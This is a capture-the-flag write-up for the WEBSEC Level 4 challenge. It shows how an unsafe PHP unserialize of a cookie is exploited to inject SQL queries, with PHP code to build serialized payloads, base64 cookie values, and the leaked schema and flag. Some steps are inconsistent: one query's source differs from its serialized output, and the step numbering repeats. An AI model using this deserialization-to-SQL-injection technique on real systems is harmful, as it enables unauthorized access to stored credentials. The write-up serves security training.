#WEBSEC Level 4


## Challenge description
Serialization is a pain!


## Initial analysis

```$sql->query = 'SELECT username FROM users WHERE id=';  //query


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));   //deserialization vuln
else  $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {      //class
    }
```

## tl;dr

STEP 1: <?php class SQL { public $query = `'SELECT sql as username FROM sqlite_master'`; }

$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?>

=> O:3:"SQL":1:{s:5:"query";s:41:"SELECT sql as username FROM sqlite_master";} => TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9


STEP 2: Assign Cookie value= `TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9`
OUTPUT: Username: CREATE TABLE users(id int, username varchar, password varchar)

STEP 3: <?php class SQL { public $query = `'SELECT password as username FROM sqlite_master'`; }

$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?>

=> O:3:"SQL":1:{s:5:"query";s:38:"SELECT password as username FROM users";} => TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9

STEP 2: Assign Cookie value= `TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9`

OUTPUT: Username: WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}

## Flag

**FLAG**: `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`

For further queries, please DM me on Twitter: <https://twitter.com/m0n574>.